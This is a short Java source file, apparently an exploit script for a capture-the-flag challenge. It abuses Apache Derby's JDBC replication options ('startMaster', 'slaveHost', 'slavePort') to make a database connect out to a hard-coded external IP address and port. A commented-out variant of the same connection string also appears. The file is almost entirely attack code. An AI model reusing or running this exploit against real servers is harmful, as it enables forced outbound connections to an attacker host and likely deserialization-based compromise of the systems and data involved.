package gadget.timu;

import org.apache.derby.jdbc.ClientDriver;

import java.net.ServerSocket;
import java.net.Socket;
import java.sql.Driver;
import java.sql.DriverManager;
import java.util.Base64;
import java.util.concurrent.TimeUnit;

public class exp {
    public static void main(String[] args) throws Exception{
        DriverManager.registerDriver((Driver)new ClientDriver());
//        DriverManager.getConnection("jdbc:derby://114.67.236.137:4851;startMaster=true;slaveHost=114.67.236.137");
        DriverManager.getConnection("jdbc:derby:///webdb;create=true;startMaster=true;slaveHost=114.67.236.137;slavePort=4851");
    }
}
